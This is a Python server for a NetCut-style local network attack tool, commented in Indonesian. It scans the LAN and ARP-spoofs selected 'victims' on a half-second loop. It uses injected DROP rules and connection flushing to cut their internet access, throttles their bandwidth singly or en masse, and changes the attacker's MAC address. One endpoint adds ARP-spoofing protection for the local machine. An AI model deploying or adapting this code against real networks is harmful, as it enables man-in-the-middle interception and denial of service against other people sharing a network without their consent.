import sys
import datetime as dt
import json
import atexit
import socket
import time
import os
import fcntl
from setproctitle import setproctitle
import logging
import subprocess as sp
import netifaces
from scapy.all import *
from bottle import route, run, app as _bottle_app
from bottle import request, response

from apscheduler.schedulers.background import BackgroundScheduler
from apscheduler.triggers.interval import IntervalTrigger


from utils import logger
from utils import get_default_gw, get_my, get_hostname, generate_mac
from utils import enable_ip_forward, disable_ip_forward, arp_spoof, arp_unspoof
from utils import arp_spoof_burst
from utils import setup_mitm
from utils import (start_arp_responder, register_victim_mac,
                   unregister_victim_mac)
from utils import set_bandwidth_limit, unset_bandwidth_limit
from utils import wake_hosts, resolve_hostnames_bulk
from utils import get_vendor, is_random_mac
from utils import setup_qos_base, teardown_qos
from utils import arp_scan_union
from utils import get_ipv6_of, has_ipv6_route
from utils import apply_cut_drop, remove_cut_drop

# ── Single-instance guard ──────────────────────────────────────────
# Mencegah 2+ proses netcontrol-server berjalan bersamaan.
# Dua instance punya victims() masing-masing → scheduler instance
# kosong akan mematikan ip_forward & mem-flush rule milik instance lain.
_LOCK_FILE = '/run/netcontrol-server.lock'
_lock_fd = None

def _acquire_lock():
    global _lock_fd
    _lock_fd = open(_LOCK_FILE, 'w')
    try:
        fcntl.flock(_lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        _lock_fd.write(str(os.getpid()))
        _lock_fd.flush()
    except OSError:
        print('ERROR: another netcontrol-server is already running. '
              'Kill it first or remove {}'.format(_LOCK_FILE),
              file=sys.stderr)
        sys.exit(1)

_acquire_lock()
setproctitle('netcontrol-server')
victims = list()

# Kunci supaya scheduler & endpoint /cut /resume tidak saling bentrok
import threading
_victims_lock = threading.RLock()

# ── Scheduler ──────────────────────────────────────────────────────
# attack_victims() berjalan tiap 0.5 detik (lebih rapat dari sebelumnya
# yang 1 detik) supaya ARP spoof konsisten & rule DROP tidak sempat
# hilang / tidak sempat menumpuk.
#
# PERUBAHAN PENTING: ketika tidak ada victim, kita TIDAK memanggil
# remove_all_cut_drops() yang flush SEMUA rule FORWARD.  Cukup
# disable_ip_forward() saja — DROP rules yang sudah terpasang tetap
# ada, tapi tanpa forward tidak ada paket yang sampai.  Kalau semua
# resume, REMOVE个别 per-victim (remove_victim_cut_drops).

def attack_victims():
    with _victims_lock:
        if len(victims) > 0:
            # setup sysctl MITM (redirect off, rp_filter off) sebelum spoof
            try:
                setup_mitm()
            except Exception:
                enable_ip_forward()
            for victim in victims:
                arp_spoof(victim)
                if victim.get('mode') == 'cut':
                    apply_cut_drop(victim)
        else:
            # Tidak ada victim: matikan forward.
            # JANGAN flush FORWARD (bisa menghapus rule milik
            # program lain).  Hanya disable_ip_forward.
            disable_ip_forward()


scheduler = BackgroundScheduler()
scheduler.start()
scheduler.add_job(
    func=attack_victims,
    trigger=IntervalTrigger(seconds=0.5),
    id='arp_attack_job',
    name='ARP Spoofing the victim list',
    replace_existing=True)


# Shut down the scheduler when exiting the app
def on_server_exit():
    logger.info('NetControl server is stopped')
    enable_ip_forward()
    scheduler.shutdown()
    # release lock file
    try:
        if _lock_fd:
            fcntl.flock(_lock_fd, fcntl.LOCK_UN)
            _lock_fd.close()
        os.remove(_LOCK_FILE)
    except Exception:
        pass


atexit.register(on_server_exit)

@route('/status')
def server_status():
    """
    check if server is running
    """
    response.headers['Content-Type'] = 'application/json'

    return json.dumps({
        'status': 'success',
        'msg': 'NetControl server is running'
    })


@route('/my/<iface>')
def get_my_info(iface):
    """
    find the IP and MAC  addressess for the given interface
    """
    response.headers['Content-Type'] = 'application/json'

    my = get_my(iface)

    return json.dumps({
        'status': 'success',
        'my': my
    })


@route('/gw')
def get_gw():
    """
    Get the default gw ip address with the iface
    """
    response.headers['Content-Type'] = 'application/json'
    gw = get_default_gw()
    if gw:
        return json.dumps({
            'status': 'success',
            'gw': gw
        })
    else:
        logger.info('No valid internet Connection')
        return json.dumps({
            'status': 'error',
            'msg': 'This computer is not connected'
        })


@route('/scan/<gw_ip>')
def scan(gw_ip):
    response.headers['Content-Type'] = 'application/json'
    live_hosts = list()
    logger.info('Start scanning {}'.format(gw_ip))

    # tentukan IP gateway & IP sendiri supaya bisa ditandai di daftar
    try:
        default_gw = netifaces.gateways()['default'][netifaces.AF_INET]
        gw_addr = default_gw[0]
        iface = default_gw[1]
    except Exception:
        gw_addr = None
        iface = 'wlan0'
    try:
        my_addr = get_if_addr(iface)
    except Exception:
        my_addr = None

    # scan ARP lengkap: union arping + ip neigh + ping-sweep (2 putaran)
    try:
        found = arp_scan_union(gw_ip, iface=iface)
    except Exception:
        logger.error(sys.exc_info()[1], exc_info=True)
        found = {}

    for ip, mac in found.items():
        live_hosts.append({
            'ip': ip,
            'mac': mac,
            'hostname': ''
        })
    logger.info('arp_scan_union: {} host'.format(len(live_hosts)))

    # pastikan perangkat ini sendiri selalu ada di daftar
    if my_addr and not any(h['ip'] == my_addr for h in live_hosts):
        try:
            my_mac = get_if_hwaddr(iface)
        except Exception:
            my_mac = ''
        live_hosts.append({
            'ip': my_addr,
            'mac': my_mac,
            'hostname': ''
        })

    try:
        self_hostname = socket.gethostname()
    except Exception:
        self_hostname = ''

    # arp_scan_union sudah melakukan ping-sweep, jadi host sudah 'bangun'.
    # langsung resolve hostname massal (mDNS paralel + satu nmap NetBIOS).
    names = {}
    try:
        names = resolve_hostnames_bulk([h['ip'] for h in live_hosts])
    except Exception:
        names = {}

    for h in live_hosts:
        name = names.get(h['ip']) or ''
        # deteksi alamat IPv6 target (kalau ada)
        try:
            h['ipv6'] = get_ipv6_of(h.get('mac', ''))
        except Exception:
            h['ipv6'] = ''
        if h['ip'] == gw_addr:
            h['hostname'] = (name + ' (GATEWAY)').strip() if name else '(GATEWAY)'
        elif h['ip'] == my_addr:
            label = self_hostname or name or ''
            h['hostname'] = (label + ' (THIS DEVICE)').strip() if label else '(THIS DEVICE)'
        elif name:
            h['hostname'] = name
        else:
            # hostname tidak didapat -> pakai info vendor dari MAC
            try:
                vendor = get_vendor(h.get('mac', ''))
            except Exception:
                vendor = ''
            if vendor:
                h['hostname'] = '? (vendor: {})'.format(vendor)
            else:
                try:
                    rand = is_random_mac(h.get('mac', ''))
                except Exception:
                    rand = False
                h['hostname'] = '? (MAC acak/privat)' if rand else '?'
    # urutkan: gateway paling atas, lalu perangkat ini
    def order(h):
        if h['ip'] == gw_addr:
            return (0, h['ip'])
        if h['ip'] == my_addr:
            return (1, h['ip'])
        return (2, h['ip'])
    live_hosts.sort(key=order)
    # info apakah jaringan punya IPv6
    try:
        ipv6_net = has_ipv6_route()
    except Exception:
        ipv6_net = False
    logger.info('live hosts: {}'.format(live_hosts))
    return json.dumps({
        'result': {
            'status': 'success',
            'ipv6_network': ipv6_net,
            'hosts': live_hosts
        }
    })


@route('/protect', method='POST')
def enable_protection():
    response.headers['Content-Type'] = 'application/json'

    gw_ip = request.forms.get('ip')
    gw_mac = request.forms.get('mac')

    if not gw_ip or not gw_mac:
        return json.dumps({
            'status': 'error',
            'msg': 'gateway ip/mac not provided'
        })

    try:
        def run(cmd):
            p = sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.PIPE)
            p.wait(timeout=10)
            return p.returncode

        # 1. bersihkan rules lama
        run(['arptables', '-F'])

        # 2. default policy: DROP semua ARP (blokir spoofing)
        run(['arptables', '-P', 'INPUT', 'DROP'])
        run(['arptables', '-P', 'OUTPUT', 'DROP'])

        # 3. izinkan hanya ARP dari/ke gateway yang MAC-nya benar
        run(['arptables', '-A', 'INPUT', '-s', gw_ip, '--source-mac', gw_mac, '-j', 'ACCEPT'])
        run(['arptables', '-A', 'OUTPUT', '-d', gw_ip, '--destination-mac', gw_mac, '-j', 'ACCEPT'])

        # 4. kunci ARP gateway secara statis (modern + legacy)
        run(['arp', '-s', gw_ip, gw_mac])
        try:
            run(['ip', 'neigh', 'replace', gw_ip, 'lladdr', gw_mac, 'dev', request.forms.get('iface', '') or 'wlan0', 'nud', 'permanent'])
        except Exception:
            pass

        logger.info('Protection Enabled for gw {} ({})'.format(gw_ip, gw_mac))
        return json.dumps({
            'status': 'success',
            'msg': 'Protection Enabled - ARP spoofing blocked for this computer'
        })
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
        return json.dumps({
            'status': 'error',
            'msg': str(sys.exc_info()[1])
        })


@route('/unprotect')
def disable_protection():
    response.headers['Content-Type'] = 'application/json'
    try:
        sp.Popen(['arptables', '-P', 'INPUT', 'ACCEPT'])
        sp.Popen(['arptables', '-P', 'OUTPUT', 'ACCEPT'])
        sp.Popen(['arptables', '-F'])
        return json.dumps({
            'status': 'success',
            'msg': 'Protection Disabled'
        })

    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
        return json.dumps({
            'status': 'error',
            'msg': sys.exc_info()[1]
        })


@route('/cut', method='POST')
def add_to_victims():
    response.headers['Content-Type'] = 'application/json'

    new_victim = request.json
    if not new_victim:
        return json.dumps({'status': 'error', 'msg': 'no data'})
    ip = new_victim.get('ip')
    if not ip:
        return json.dumps({'status': 'error', 'msg': 'ip required'})

    # set mode = cut (putus total)
    new_victim['mode'] = 'cut'

    # kunci supaya tidak race dengan scheduler
    with _victims_lock:
        # masukkan ke daftar victims DULU, supaya scheduler tidak
        # menganggap "tidak ada victim" lalu mem-flush rule baru.
        for v in list(victims):
            if v.get('ip') == ip:
                victims.remove(v)
        victims.append(new_victim)

        # baru bersihkan limit tc (lambat) & pasang DROP
        try:
            unset_bandwidth_limit(new_victim)
        except Exception:
            pass
        try:
            setup_mitm()
            # flush_conntrack=True: bunuh koneksi established saat cut
            # pertama supaya victim langsung putus (bukan nunggu timeout)
            apply_cut_drop(new_victim, flush_conntrack=True)
        except Exception:
            pass
        # BURST spoof SEKARANG (di luar lock tidak masalah) supaya ARP
        # cache victim & gateway langsung teracuni, tidak menunggu
        # siklus scheduler → cut langsung terasa, hasil konsisten.
        try:
            arp_spoof_burst(new_victim, count=10)
        except Exception:
            pass

        # Daftarkan ke ARP responder supaya ARP request victim dijawab
        # instan (membuat cut konsisten walau cache victim expired).
        try:
            gw = get_default_gw()
            my = get_my(gw['iface'])
            start_arp_responder(gw['iface'])
            register_victim_mac(new_victim.get('mac'), gw=gw, my=my)
        except Exception:
            pass

    return json.dumps({
        'status': 'success',
        'msg': 'new victim add'
    })


@route('/resume', method='POST')
def resume_victim():
    response.headers['Content-Type'] = 'application/json'

    victim = request.json or {}
    ip = victim.get('ip')
    with _victims_lock:
        # hapus berdasarkan IP (dict di list punya field 'mode',
        # jadi perbandingan dict langsung akan selalu gagal).
        if ip:
            for v in list(victims):
                if v.get('ip') == ip:
                    victims.remove(v)
        # hapus juga limit bandwidth-nya
        try:
            unset_bandwidth_limit(victim)
        except Exception:
            pass
        # hapus aturan DROP cut
        try:
            remove_cut_drop(victim)
        except Exception:
            pass
    arp_unspoof(victim)

    # lepas dari ARP responder
    try:
        unregister_victim_mac(victim.get('mac'))
    except Exception:
        pass

    # pastikan rule DROP benar-benar bersih (scheduler bisa saja
    # sempat menambah satu rule tepat sebelum victim dihapus dari list)
    try:
        remove_cut_drop(victim)
    except Exception:
        pass

    return json.dumps({
        'status': 'success',
        'msg': 'victim  resumed'
    })


@route('/limit', method='POST')
def limit_bandwidth():
    """
    Batasi bandwidth sebuah host (seperti NetCut).
    Body JSON: {ip, mac, hostname, upload, download}  (upload/download dalam kbit/detik)
    """
    response.headers['Content-Type'] = 'application/json'
    data = request.json or {}
    victim = {
        'ip': data.get('ip'),
        'mac': data.get('mac', ''),
        'hostname': data.get('hostname', '')
    }
    try:
        upload = int(data.get('upload', 0) or 0)
        download = int(data.get('download', 0) or 0)
    except (ValueError, TypeError):
        return json.dumps({'status': 'error', 'msg': 'invalid upload/download value'})

    if not victim['ip']:
        return json.dumps({'status': 'error', 'msg': 'ip required'})

    # mode limit: trafik tetap diteruskan, hanya dibatasi kecepatannya
    victim['mode'] = 'limit'
    with _victims_lock:
        for v in list(victims):
            if v.get('ip') == victim['ip']:
                victims.remove(v)
        victims.append(victim)
        ok, msg = set_bandwidth_limit(victim, upload_kbit=upload, download_kbit=download)

    # burst spoof + daftarkan ARP responder supaya limit konsisten
    if ok:
        try:
            arp_spoof_burst(victim, count=10)
        except Exception:
            pass
        try:
            gw = get_default_gw()
            my = get_my(gw['iface'])
            start_arp_responder(gw['iface'])
            register_victim_mac(victim.get('mac'), gw=gw, my=my)
        except Exception:
            pass

    if ok:
        return json.dumps({'status': 'success', 'msg': msg})
    return json.dumps({'status': 'error', 'msg': msg})


@route('/unlimit', method='POST')
def unlimit_bandwidth():
    """Hapus batas bandwidth sebuah host."""
    response.headers['Content-Type'] = 'application/json'
    data = request.json or {}
    victim = {
        'ip': data.get('ip'),
        'mac': data.get('mac', ''),
        'hostname': data.get('hostname', '')
    }
    if not victim['ip']:
        return json.dumps({'status': 'error', 'msg': 'ip required'})
    ok, msg = unset_bandwidth_limit(victim)

    # HAPUS juga dari daftar victims — kalau tidak, scheduler terus
    # ARP-spoof & menyalakan ip_forward untuk host yang sudah tidak
    # dilimit (bug lama: host "nyangkut" di daftar).
    with _victims_lock:
        for v in list(victims):
            if v.get('ip') == victim['ip']:
                victims.remove(v)

    # kembalikan ARP cache victim ke gateway asli. Tanpa ini, victim
    # tetap mengira kita gateway → trafiknya tidak diteruskan (kita
    # sudah tidak forward) → victim tampak rusak walau sudah unlimit.
    try:
        arp_unspoof(victim)
    except Exception:
        pass

    # lepas dari ARP responder
    try:
        unregister_victim_mac(victim.get('mac'))
    except Exception:
        pass

    if ok:
        return json.dumps({'status': 'success', 'msg': msg})
    return json.dumps({'status': 'error', 'msg': msg})


@route('/limit-all', method='POST')
def limit_all_bandwidth():
    """
    Turunkan bandwidth host terpilih sekaligus (massal).
    Body JSON:
      {
        "upload": <kbit>, "download": <kbit>,
        "hosts": [ {ip, mac, hostname}, ... ],   # semua host di tabel
        "selected": ["ip1","ip2", ...]           # yang AKAN DILIMIT (checked)
      }
    Gateway & perangkat sendiri selalu dikecualikan.
    """
    response.headers['Content-Type'] = 'application/json'
    data = request.json or {}
    try:
        upload = int(data.get('upload', 0) or 0)
        download = int(data.get('download', 0) or 0)
    except (ValueError, TypeError):
        return json.dumps({'status': 'error', 'msg': 'invalid upload/download'})

    hosts = data.get('hosts', [])
    selected = set(data.get('selected', []))

    # HANYA gateway yang selalu dikecualikan.
    # Perangkat sendiri (THIS DEVICE) BOLEH dilimit/dicut.
    protect = set()
    try:
        gw = get_default_gw()
        if gw.get('ip'):
            protect.add(gw['ip'])
    except Exception:
        pass

    # target = yang dipilih & bukan gateway
    targets = [h for h in hosts if h.get('ip') in selected and h.get('ip') not in protect]

    done = []
    failed = []
    # siapkan struktur QoS dasar SEKALI (jauh lebih cepat untuk banyak host)
    if targets:
        try:
            iface = get_default_gw().get('iface', 'wlan0')
            setup_qos_base(iface)
            enable_ip_forward()
        except Exception as e:
            logger.error(sys.exc_info()[1], exc_info=True)

    for h in targets:
        victim = {'ip': h.get('ip'), 'mac': h.get('mac', ''), 'hostname': h.get('hostname', ''),
                  'mode': 'limit'}
        with _victims_lock:
            for v in list(victims):
                if v.get('ip') == victim['ip']:
                    victims.remove(v)
            victims.append(victim)
        ok, msg = set_bandwidth_limit(victim, upload_kbit=upload, download_kbit=download,
                                      setup_base=False)
        if ok:
            done.append(h.get('ip'))
        else:
            failed.append(h.get('ip'))

    logger.info('Mass limit: done={} failed={} protect={}'.format(done, failed, list(protect)))
    return json.dumps({
        'status': 'success',
        'msg': 'Limited {} host(s)'.format(len(done)),
        'done': done,
        'failed': failed,
        'excluded': list(protect)
    })


@route('/resume-all', method='POST')
def resume_all():
    """
    Nyalakan (resume) SEMUA host yang sedang di-cut/limit sekaligus (dipercepat).
    """
    response.headers['Content-Type'] = 'application/json'
    data = request.json or {}
    hosts = data.get('hosts', [])
    from concurrent.futures import ThreadPoolExecutor

    # ── LANGKAH PENTING: keluarkan dulu host dari daftar victims ──
    # Kalau tidak, scheduler (tiap 0.5s) akan memasang ulang rule DROP
    # selama kita sibuk unspoof → rule "nyangkut" & host tetap ter-cut.
    target_ips = set(h.get('ip') for h in hosts)
    with _victims_lock:
        for v in list(victims):
            if v.get('ip') in target_ips:
                victims.remove(v)

    # 1. bersihkan qdisc (sekali saja)
    try:
        iface = get_default_gw().get('iface', 'wlan0')
        teardown_qos(iface)
    except Exception:
        pass

    # 2. hapus rule DROP + unspoof semua host secara paralel
    def _unspoof(h):
        v = {'ip': h.get('ip'), 'mac': h.get('mac', ''), 'hostname': h.get('hostname', '')}
        try:
            remove_cut_drop(v)
        except Exception:
            pass
        try:
            arp_unspoof(v)
        except Exception:
            pass
        try:
            unregister_victim_mac(v.get('mac'))
        except Exception:
            pass
        return v['ip']

    done = []
    if hosts:
        with ThreadPoolExecutor(max_workers=min(len(hosts), 16)) as pool:
            done = list(pool.map(_unspoof, hosts))

    # 3. pastikan rule benar-benar bersih (scheduler bisa saja sempat
    #    memasang satu rule sebelum kita hapus dari daftar di atas)
    for h in hosts:
        try:
            remove_cut_drop({'ip': h.get('ip')})
        except Exception:
            pass

    logger.info('Mass resume: {}'.format(done))
    return json.dumps({
        'status': 'success',
        'msg': 'Resumed {} host(s)'.format(len(done)),
        'done': done
    })

@route('/change-mac/<iface>')
def scan(iface):
    response.headers['Content-Type'] = 'application/json'
    logger.info('Changing MAC Address for interface {}'.format(iface))
    new_MAC = generate_mac()
    try:
        # sp.Popen(['ifconfig', iface, 'down'], stdout=sp.PIPE)
        sp.Popen(['ifconfig', iface, 'down', 'hw', 'ether', new_MAC], stdout=sp.PIPE)
        sp.Popen(['ifconfig', iface, 'up'], stdout=sp.PIPE)
        logger.info('MAC Address for interface {} Changed to {}'.format(iface, new_MAC))
        return json.dumps({
            'result': {
                'status': 'success'
            }
        })
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
        return json.dumps({
            'result': {
                'status': 'failed'
            }
        })

if __name__ == '__main__':
    logger.info('NetControl server starting ...')
    try:
        # server multi-thread (waitress) supaya request tidak saling memblokir
        # (sebelumnya single-thread: scan & status harus antre -> lambat)
        import waitress
        waitress.serve(_bottle_app(), host='127.0.0.1', port=8013, threads=12)
    except ImportError:
        # fallback: bottle built-in
        run(host='127.0.0.1', port=8013, reloader=False)
    logger.info('NetControl server successfully started')
